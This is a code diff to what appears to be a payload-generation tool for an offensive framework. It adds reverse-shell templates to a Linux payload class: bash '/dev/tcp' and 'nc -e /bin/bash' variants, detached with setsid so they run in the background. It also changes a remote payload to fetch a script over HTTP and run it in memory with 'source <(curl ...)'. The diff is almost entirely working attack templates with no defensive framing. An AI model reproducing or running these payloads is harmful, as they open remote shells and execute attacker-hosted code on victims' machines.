@@ -126,14 +126,16 @@ class LinuxPayload(DefaultPayload):
     """
     _reverse_shell_template = [
                                 'bash -c "bash -i >& /dev/tcp/<IP>/<PORT> 0>&1"',
-                                'nc -e /bin/bash <IP> <PORT>'
+                                'nc -e /bin/bash <IP> <PORT>',
+                                'bash -c "setsid bash -i >& /dev/tcp/<IP>/<PORT> 0>&1 2>&1 &"',
+                                'setsid nc -e /bin/bash <IP> <PORT> &'
                                 ]
     def __init__(self):
         self.default_output = "show"
 
 class RemoteLinuxPayload(RemotePayload):
-    _reverse_shell_template = [
-                                'curl -s http://<IP>:<PORT>/<ROUTE> | bash'
+    _reverse_shell_template = [ # This payload loads the script and interpret it in memory of the current shell
+                                'source <(curl -s http://<IP>:<PORT>/<ROUTE>)'
                                 ]
 
 class RemoteWindowsPayload(RemotePayload):
@@ -148,7 +150,7 @@ class RemotePowershellPayload(RemotePayload):
 
 class PayloadBuilder:
     """
-    Generator is the class responsible for generating a payload
+    PayloadBuilder is the class responsible for building a payload class
     """
 
     PayloadClass = {
